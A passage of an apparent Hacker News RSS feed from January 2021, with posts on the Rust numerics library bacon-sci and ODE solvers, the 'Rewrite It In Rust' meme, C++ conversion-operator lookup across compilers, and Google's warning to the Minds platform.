<a href="https://github.com/aftix/bacon">bacon</a>, named after Francis Bacon and the pork based food; however, <code>bacon</code> is already
a crate, so I went for the next best thing: <a href="https://crates.io/crates/bacon-sci">bacon-sci</a>.</p>
<p>I started out with the easiest part. SciPy has a set of scientific constants from
the NIST. I just took the list of important constants from SciPy and put it in a module.
In addition, I took NIST's CODATA and put it into a global map that corresponds a
String of the constant's name to a triplet: an f64 of its value, an f64 of its uncertainty,
and a String of its units. How do you make a static map? I just used the <code>lazy_static</code>
crate.</p>
<p>Next, I returned to the area that inspired me: initial value problems. After that,
I tackled root finding and polynomials. Lastly, as of now, I implemented a few special
polynomials and numeric differentiation. Armed with a copy of Burden and Faires's
"Numerical Analysis (8th ed.)", Wikipedia, and SciPy source code, I went to work.</p>
<p>The first decision I made was to use a linear algebra crate, specifically <code>nalgebra</code>.
I have written many vector and matrix implementations in the past, and I didn't feel
like doing it this time. Besides, <code>nalgebra</code> is probably faster than anything I
can write.</p>
<p>The next decision was using the <code>alga</code> crate to handle generics
of complex types and real types. I wanted all algorithms that could work on
complex numbers to be able to, so most of the functions in <code>bacon-sci</code> work on
<code>N: ComplexField</code>. If an algorithm requires a parameter to be well-ordered (like time),
then it is a <code>N: RealField</code>. In cases where a function takes both, the generic parameter
is a <code>N: ComplexField</code> with the real parameters being <code>N::RealField</code>, which is the real
"backing type" of the possibly complex field. Some functions require complex arithmetic,
so they automatically upgrade from <code>N: ComplexField</code> to <code>Complex&lt;N::RealField&gt;</code> from
<code>num_complex</code>.</p>
<p>Interestingly, there are cases where I wanted to automatically
downgrade from definitely complex back to "maybe complex", which was more difficult
than the other way. To upgrade, all I needed was <code>Complex::&lt;N::RealField&gt;::new(z.real(), z.imaginary())</code>,
where <code>z</code> is a possibly complex value,
with real types giving zero on the imaginary component. To go the other way, I decided
to basically take the real component and ignore the imaginary component. To do this from
a <code>N: ComplexField</code> I had to check if <code>N::RealField == N</code> to see if <code>N</code> was real
or complex. To do this, I used <code>TypeId::of::&lt;N::RealField&gt;() == TypeId::of::&lt;N&gt;()</code>.
If <code>N</code> was real, converting from complex was easy: use <code>ComplexField::from_real</code> on
the real component, ignoring the imaginary. On the other hand, if <code>N</code> was complex,
the conversion needed to preserve the imaginary component. <code>ComplexField</code> has no
<code>from_imaginary</code>, so I directly implemented \( a + bi \) with
<code>ComplexField::from_real(z.re) + (-ComplexField::one()).sqrt() * ComplexField::from_real(z.im)</code>,
with <code>z</code> being the definitely complex value.</p>
<h2>Euler Method</h2>
<p>A differential equation is an equation describing a thing in terms of how
that thing changes. For those unfamiliar, <a href="https://www.youtube.com/watch?v=p_di4Zn4wz4">this</a>
is a good introduction. In order to solve a differential equation, you need some conditions.
These come in two flavors: boundary conditions and initial values, with both names
being self-describing. My second task on <code>bacon-sci</code> was to implement algorithms
that solve initial value differential equations, referred to as initial value
problems or <code>ivp</code> in the code.</p>
<p>Abstractly, the system of differential equations can be written, with an arrow
representing a vector quantity, as
\[ \frac{\mathrm{d}\vec{y}}{\mathrm{d}t} = f(t, \vec{y}) . \]
This is a first-order system of differential equations since
only the first derivative is present. Generally, many higher-order
equations can be reduced to first-order by thinking of each derivative
as a new variable. The initial condition is then represented as
\[ \vec{y}(t_0) = \vec{y}_0 \]</p>
<p>These equations immediatly lead to the first algorithm
for solving initial value problems, Euler's method. Consider
this question: given a timestep \( \Delta t \), what is the
corresponding \( \Delta \vec{y} \)? We can approximate
\( \Delta \vec{y} / \Delta t \approx \mathrm{d}\vec{y}/\mathrm{d}t = f(t, \vec{y}) \),
(that is, use the tangent line to estimate the function),
leading to \( \Delta \vec{y} = f(t, \vec{y} )\Delta t \). This gives us an iterative
algorithm, \( \vec{y}_{i + 1} = \vec{y}_{i} + f(t, \vec{y})\Delta t \). This
is Euler's method. From the starting conditions, pick a timestep and iterate until
you reach the end.</p>
<p>So how good is Euler's method? Not very good. As an example, imagine solving
a mechanics differential equation with positions and velocities. Conservation
of energy says that energy should be conserved. Will Euler's method conserve
energy? In general, it will not. Energy in Euler's method tends to explode.
One solution to this is to use a slightly different version of the algorithm
known as Euler-Cromer or the semi-implicit Euler's method. In this method,
velocities are updated first, then positions are updated using the new velocities
(in Euler's method, you'd use the old velocities). Euler-Cromer is much better,
tending to conserve energy, especially in spring systems. According to Gaffer on Games,
game physics tend to use the Euler-Cromer as it only requires calculating the derivative
once but gives much better results than Euler's.</p>
<h2>Runge-Kutta Methods</h2>
<p>One problem with Euler's method is that the error in each step is linear in the
step size. We can do better. To start with, remember Taylor series from
basic calculus. That is, remember you can approximate a function of one
variable like
\[
f(x) = f(x_0) + f'(x_0) (x - x_0) + \frac{f''(x_0)}{2} {(x - x_0)}^2 + \ldots .
\]
Similarly, we can approximate our derivative function from the last section with
\[
f(t, \vec{y}) = f(t_0, \vec{y}_0)
+ \left((t - t_0)\frac{\partial f}{\partial t}(t_0, \vec{y}_0)
+(\vec{y} - \vec{y}_0)\frac{\partial f}{\partial \vec{y}}(t_0, \vec{y}_0)\right)
+ \ldots ,
\]
where the powers of our vectors are done element-wise. Additionally, Taylor's Theorem
bounds the error via some small parameters \(\xi, \mu\).
In this light, we can say Euler's method is a zeroth order approximation, which is
why the error is linear. You can use Taylor polynomials for better IVP solvers, but
this requries information about the derivatives of \(f\). Instead, Runge-Kutta
methods allow for tighter error bounds without using the derivative.</p>
<p>To see an example of this, I will derivethe midpoint method here. Imagine for a
moment that instead of taking a full timestep, you take a partial timestep and use
\(f\) at that point to approximate the second Taylor polynomial. That is, choose
a \(a_1, \alpha_1, \beta_1\) so that \(a_1 f(t + \alpha_1, \vec{y} + \beta_1)\)
approximates
\[
T^{(2)}(t, \vec{y}) = f(t, \vec{y}) + \frac{h}{2}f'(t, \vec{y}),
\]
where \(h\) is the timestep, with quadratic error in the timestep.
Note that \(f'(t, y) = \partial f/\partial t(t, \vec{y})
+ \partial f/\partial \vec{y}(t, \vec{y}) \vec{y}'(t) \).
Thus,
\[
T^{(2)} = f(t, \vec{y}) + \frac{h}{2}\frac{\partial f}{\partial t}f(t, \vec{y})
+ \frac{h}{2}\frac{\partial f}{\partial \vec{y}}(t, \vec{y}) f(t, \vec{y}) .
\]
Expanding \(a_1 f(t + \alpha_1, \vec{y} + \beta_1)\) via Taylor series gives
\[
a_1 f(t, \vec{y}) + a_1 \alpha_1 \frac{\partial f}{\partial t}(t, \vec{y})
+ a_1\beta_1 \frac{\partial f}{\partial y}(t, y) .
\]
Thus, \(a_1 = 1\), \(a_1 \alpha_1 = h/2\), and \(a_1 \beta_1 =
f(t, \vec{y}) h / 2\). This uniquely determines the coefficients, giving rise to
the midpoint method:
\[
\vec{y}_{i + 1} = \vec{y}_i + hf\left(t_i + \frac{h}{2}, \vec{y}_i + \frac{h}{2}f\left(t_i, \vec{y}_i\right)\right) .
\]</p>
<p>This process can be repeated for higher order polynomials. The classic
Runge-Kutta method is order 4, and is used as follows:
\[
\vec{k}_1 = hf(t_i, \vec{y}_i),
\]</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://aftix.xyz/home/bacon/">https://aftix.xyz/home/bacon/</a></em></p>]]>
            </description>
            <link>https://aftix.xyz/home/bacon/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807341</guid>
            <pubDate>Sun, 17 Jan 2021 01:56:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Have you considered Rewriting It In Rust? (2016)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25807127">thread link</a>) | @CyberRabbi
<br/>
January 16, 2021 | http://transitiontech.ca/random/RIIR | <a href="https://web.archive.org/web/*/http://transitiontech.ca/random/RIIR">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="layout">
    <div id="main">
        
        
        <div id="content" data-role="content"> 
<p>My first proper programming language was C.
It was super confusing, and I wrote some terrible code that didn't really do anything terribly useful.</p>
<p>Along the way, however, I learned a bit about how computers do things, sort of.
I say sort of because <a href="http://programmers.stackexchange.com/questions/267583/why-is-c-still-in-the-category-of-high-level-language" title="If you disagree, please voice your dissent in my comment section">C is a <em>high level language</em></a>.</p>
<p>Of course, there are <em>higher-level</em> languages, and those end up being really good for a very wide array of tasks, so I went and learned them, and then I started actually getting things done.
I'm glad I started with C, though, since it gave me an idea of what these other languages must be doing under the hood to accomplish so much with so little code.</p>
<p>Using Scheme, Python, or Javascript, I didn't have to bother with managing the computer's memory allocation manually, and that turned out to be a lot more fun.</p>
<p>At some point a while back, I heard about <a href="https://www.rust-lang.org/">Rust-lang</a>.</p>
<p>What is Rust?</p>
<blockquote>
<p>Rust is a systems programming language that runs blazingly fast, prevents segfaults, and guarantees thread safety. </p>
</blockquote>
<h2 id="sounds-good-right">Sounds good, right?</h2>
<p>Yea, actually.</p>
<p>I think it's a pretty awesome language.
The problem is, I make my living writing stuff working on web apps, and that means writing Javascript.
That's not a problem, necessarily, but I just don't have much use for a language like Rust.</p>
<p>It definitely seems awesome, and as a lisp aficionado, I love a lot of its high level concepts.
As I recall, Rust even has properly nesting block comments, which I find quite practical.</p>
<h2 id="where-am-i-going-with-this">Where am I going with this?</h2>
<p>Well, I just wanted to clear up that I don't think Rust is a bad language.
I'm not going to criticize <em>Rust</em> in this article, however, I am going to criticize a part of the community surrounding the language.</p>
<p>To be honest, actually, I'm not really sure the people I'm going to criticize are even a part of the community.
At best, they seem to be a part of the fringe.</p>
<p>Who are these people?</p>
<p>They are the people who show up unannounced on your software project's doorstep (probably your issue tracker) and ask the following question:</p>
<blockquote>
<p>Have you considered <em><strong>Rewriting It In Rust</strong></em>?</p>
</blockquote>
<h2 id="yes-im-starting-a-language-flame-war">Yes, I'm starting a language flame war</h2>
<p>Ok, here we go.</p>
<p>If you've spent any time at all in a community where programmers hang out, you've probably seen a flame war over which language is best.</p>
<p>I don't know which language is best, though I've argued for Scheme many times because nobody else seems to be doing it.</p>
<p>That being said, I've noticed that this particular subset of the Rust community seems to do this particular thing often enough that it's nearly the only thing that I know about the Rust community.</p>
<p>I've joked about it with friends and coworkers, and sure enough, most of them have witnessed it in the wild.</p>
<p>I believe the first time I saw it was on the (now disabled) <a href="https://github.com/cjdelisle/cjdns">cjdns</a> issue tracker.</p>
<p>I was lucky enough to have the tracker turned on for long enough that I was able to get a screenshot:</p>
<p><img src="http://transitiontech.ca/assets/riir/cjdns-eventually-moving-to-rust.jpg" alt="" title="'prevent thread problems' in software that runs on one thread... yea"></p>
<p>It all started and ended pretty quickly.
Some <em>Rustafarian</em> asked a question, and the author (<a href="https://github.com/cjdelisle">@cjdelisle</a>) answered somewhat sarcastically.</p>
<p>Once OP figures out that their brilliant idea is not being taken seriously, they get annoyed and leave.</p>
<h2 id="but-wait-theres-more">But wait, there's more</h2>
<p>Yea, of course it goes on.
I heard it a few more times, laughed about it (oh, this again), and then continued on with my life.</p>
<p>Of course, clearly it happened enough times that I started to notice a trend, because as I mentioned, I've joked about it with people, and they've noticed it too.</p>
<p>So, this morning (<strong>2016-03-22</strong>) I saw <a href="https://github.com/fc00/go-fc00/issues/1">a thread</a> in a repo I'm watching, and there it was again:</p>
<p><img src="http://transitiontech.ca/assets/riir/go-fc00-why-go.jpg" alt="" title="...my actual question was about building a maybe more valuable solution..."></p>
<p>Once again, my friends make some snappy comments.
Pair those with a classic <em>if you want it written why don't you write it</em>, a few more <em>lulz</em> and our <em>Rustacean</em> acquaintance gets annoyed:</p>
<blockquote>
<p>ok, didn't thought a simple question would attract that much angry trolls.</p>
</blockquote>
<p>..and things pretty much die out.</p>
<h2 id="but-then-i-started-thinking">But then I started thinking</h2>
<p>We joked about it on IRC, and a few more people comment that they've also seen this in the wild, and quickly enough we find that we need an acronym because <em>Rewrite It In Rust</em> takes too long to type and so <strong>RIIR</strong> is born.</p>
<p>So, naturally, once an acronym is born, we have a meme, and memes like to spread.
So, naturally, I start digging:</p>
<blockquote>
<p>Who else has been hit by this storm that has been sweeping the web?</p>
</blockquote>
<h3 id="nix">Nix</h3>
<p>Apparently there were a few threads like <a href="http://lists.science.uu.nl/pipermail/nix-dev/2015-December/019040.html">this one</a> which went on for a while.
I haven't checked the exact timelines, but since this is a language flame war, I'm sure somebody will leap in to do that research for me.</p>
<p><img src="http://transitiontech.ca/assets/riir/nix-dev-perl-to-rust.jpg" alt="" title="Rust does this very well, to the point where me enumerating its benefits would be redundant."></p>
<h3 id="tor">Tor</h3>
<p>Yup, Tor, the very large, critical infrastructure that keeps journalists, criminals, schizophrenics, and <del>piracy</del> privacy activists anonymous has been <a href="https://trac.torproject.org/projects/tor/ticket/11331">asked to rewrite their software</a>.</p>
<p><img src="http://transitiontech.ca/assets/riir/rewrite-tor-in-rust.jpg" alt="" title="Writing C code that is safe is super hard (even for exeperienced Tor devs)"></p>
<h2 id="more-still">More still...</h2>
<p>Why not <a href="https://www.quora.com/Would-it-be-possible-advantageous-to-rewrite-the-Linux-kernel-in-Rust-when-the-language-is-stable" title="this one isn't on an issue tracker, at least">rewrite the Linux Kernel</a>? I'd love to hear Linus's answer to this.</p>
<p>Then of course there's <a href="https://news.ycombinator.com/item?id=11337399">this comprehensive thread</a> on Hacker News covering a bunch of angles on the pros and cons of this meme.</p>
<p>Finally, I stumbled across <a href="http://robert.ocallahan.org/2016/02/rewrite-everything-in-rust.html" title="rewrite everytihng in rust">this blog</a>.</p>
<p>Despite being quite new, and certainly newer than the meme itself, this post seems to exemplify many of the talking points extolled by proponents of <strong>RIIR</strong>.</p>
<p>Its title even comes in the form of a call to action:</p>
<blockquote>
<p>Rewrite Everything In Rust</p>
</blockquote>
<h2 id="so">So...?</h2>
<p>I don't really have more to say on the matter.
I just wrote this much to document a phenomenon I've noticed.</p>
<p>I don't have a comments section, because it ends up being really time consuming to say annoying, opinionated things if you have to answer for the fallout in your comments section.
Instead, I made <a href="https://github.com/ansuz/RIIR" title="Rewrite It In Rust">a github repo</a> where you can <a href="https://github.com/ansuz/RIIR/issues">file an issue</a> which:</p>
<ol>
<li>voices your own obnoxious opinion</li>
<li>supports my thesis<ul>
<li>super bonus points if you find more github issues asking for Rust rewrites</li>
</ul>
</li>
<li>refutes my thesis<ul>
<li>super science points if you find that this behaviour is not exhibited disproportionately by Rust users</li>
</ul>
</li>
<li>links to some project where somebody actually did <em>Rewrite It In Rust</em></li>
</ol>
<h2 id="did-this-post-offend-you">Did this post offend you?</h2>
<p>Cool.</p>
<p>Talk about it.</p>
<p>Tell your friends.</p>
<p>Good memes die hard.</p>
<p>--ansuz</p>
<p><strong>2016-03-22</strong></p>
 </div>
    </div>
</div></div>]]>
            </description>
            <link>http://transitiontech.ca/random/RIIR</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807127</guid>
            <pubDate>Sun, 17 Jan 2021 01:10:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fun with conversion-operator name lookup]]>
            </title>
            <description>
<![CDATA[
Score 38 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25806846">thread link</a>) | @mmastrac
<br/>
January 16, 2021 | https://quuxplusone.github.io/blog/2021/01/13/conversion-operator-lookup/ | <a href="https://web.archive.org/web/*/https://quuxplusone.github.io/blog/2021/01/13/conversion-operator-lookup/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>As of this writing (but perhaps not for very much longer!) the four mainstream compilers
on Godbolt Compiler Explorer give four different answers for
<a href="https://godbolt.org/z/jo3dc4">this simple C++ program</a>:</p>

<div><div><pre><code>struct A {
    using T = T1;
    using U = U1;
    operator U1 T1::*();
    operator U1 T2::*();
    operator U2 T1::*();
    operator U2 T2::*();
};

inline auto which(U1 T1::*) { return "gcc"; }
inline auto which(U1 T2::*) { return "icc"; }
inline auto which(U2 T1::*) { return "msvc"; }
inline auto which(U2 T2::*) { return "clang"; }

int main() {
    A a;
    using T = T2;
    using U = U2;
    puts(which(a.operator U T::*()));
}
</code></pre></div></div>

<p>The question is whether <code>U</code> should be looked up in the scope of <code>test</code> or in the scope of <code>A</code>;
and the same question for <code>T</code>.</p>

<p>According to the current draft standard, it sounds like the conforming answer is
“they should <em>both</em> be looked up in the scope of <code>A</code>”; i.e., GCC’s answer is correct
and the others are wrong in three different ways. <a href="http://eel.is/c++draft/basic.lookup.unqual#5">[basic.lookup.unqual]/5</a>:</p>

<blockquote>
  <p>An unqualified name that is a component name of a <em>type-specifier</em> or <em>ptr-operator</em>
of a <em>conversion-type-id</em> is looked up in the same fashion as the <em>conversion-function-id</em>
in which it appears. If that lookup finds nothing, it undergoes unqualified name lookup;
in each case, only names that denote types or templates whose specializations are types are considered.</p>
</blockquote>

<p>I’m never a fan of lookups that don’t consider certain <em>kinds</em> of names; I’m sure there’s more divergence
to be discovered in this area. Anyway, in the type name <code>U T::*</code>, <code>U</code> is the <em>type-specifier</em>
and <code>T::*</code> is the <em>ptr-operator</em>, and the whole type is pronounced “pointer to a data member of <code>T</code>,
where that data member itself is of type <code>U</code>.”
(More concisely: “pointer to data member (of type <code>U</code>) of <code>T</code>,” or “pointer to a <code>U</code> member of <code>T</code>.”)</p>

<p>See also:</p>

<ul>
  <li><a href="https://quuxplusone.github.io/blog/2019/09/10/friend-access-inconsistencies/">“Implementation divergence with <code>friend</code>”</a> (2019-09-10)</li>
</ul>

  </div></div>]]>
            </description>
            <link>https://quuxplusone.github.io/blog/2021/01/13/conversion-operator-lookup/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25806846</guid>
            <pubDate>Sun, 17 Jan 2021 00:21:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google sends ‘24 hour warning’ to free-speech ‘anti-Facebook’ platform, Minds]]>
            </title>
            <description>
<![CDATA[
Score 37 | Comments 35 (<a href="https://news.ycombinator.com/item?id=25806746">thread link</a>) | @drummer
<br/>
January 16, 2021 | https://speakingaboutnews.com/google-sends-24-hour-warning-to-free-speech-anti-facebook-platform-minds/ | <a href="https://web.archive.org/web/*/https://speakingaboutnews.com/google-sends-24-hour-warning-to-free-speech-anti-facebook-platform-minds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			<p><strong>The social media platform Minds had to remove ‘major functionality’ from its Android app after getting a chilling warning from Google. Its co-founder said plans for a censorship-resistant infrastructure are in the works.</strong></p>
<p>In a&nbsp;<a href="https://www.minds.com/newsfeed/1196949029506060288" rel="noreferrer noopener" target="_blank">post</a>&nbsp;on Friday evening, Bill Ottman said that Minds had received a&nbsp;<em>“24 hour warning”</em>&nbsp;from the Google Play store. This forced them to submit an updated version of the app, based on&nbsp;<em>“interim solution and ninja developers,”</em> which removed the search, discovery and comments functionality.</p>
<p><em>“I know. We aren’t happy and will be working towards something better,”</em>&nbsp;Ottman said.&nbsp;<em>“What is happening on the internet with major providers is fueling the cultural divide as much as anything,”</em>&nbsp;he added.</p>
<p>Operating since 2015, Minds was conceived as a blockchain-based community-owned social media platform that would not monetize user data but enable free speech instead.&nbsp;<a href="https://www.wired.com/story/minds-anti-facebook/" rel="noreferrer noopener" target="_blank">Wired</a>&nbsp;magazine once described it as the&nbsp;<em>“anti-Facebook.”</em></p>
<p><em>Owen is joined by James O’Keefe of Project Veritas, after the explosive video released of Twitter CEO Jack Dorsey who revealed his true intentions on social media.</em></p>
<p>Ottman advised users to download the app from Minds directly if possible.&nbsp;<em>“If you are on Apple, leave if you’re smart,”</em>&nbsp;he said.</p>


<p>As for going forward, he said a plan for&nbsp;<em>“fully censorship-resistant infrastructure”</em>&nbsp;is coming soon, and that Minds has&nbsp;<em>“multiple escape pods ready to go”</em>&nbsp;if Amazon moves against them.</p>
<p>Ottman’s comments were a clear reference to what happened to Parler. The free-speech social media platform attracted tens of thousands of users purged from Twitter in the wake of the January 6 unrest at the US Capitol – only to be banned from Google and Apple stores, and then taken down from the internet entirely after Amazon Web Services (AWS) denied them access to the cloud. Parler’s executives later revealed that other vendors rushed to jump ship as well, leaving them unable to operate entirely.</p>
<p>Those who complained about the rising tide of censorship have typically been told that the First Amendment to the US Constitution did not apply to private companies and that people should&nbsp;<em>“build their own”</em>&nbsp;platforms if they disagreed. Parler’s shutdown has shown that this is near-impossible when the major players control the internet infrastructure itself, however.</p>
<p>Mainstream media and tech platforms have gone after Parler, Gab, Minds, and Telegram for allegedly having&nbsp;<em>“far-right”</em>users and allowing&nbsp;<em>“hate speech”</em>&nbsp;as content. In Parler’s case, Amazon’s ultimatum demanded moderation policies they would approve of in order to avoid removal from AWS.</p>
<p>In a lawsuit accusing Amazon of breach of contract, antitrust violations and defamation, Parler argued that this was pretextual and revealed that Amazon staff sought to find out if US President Donald Trump – freshly banned from Twitter and locked out of Facebook – had set up an account on the platform.</p>
    
    		</div></div>]]>
            </description>
            <link>https://speakingaboutnews.com/google-sends-24-hour-warning-to-free-speech-anti-facebook-platform-minds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25806746</guid>
            <pubDate>Sun, 17 Jan 2021 00:03:08 GMT</pubDate>
        </item>
    </channel>
</rss>
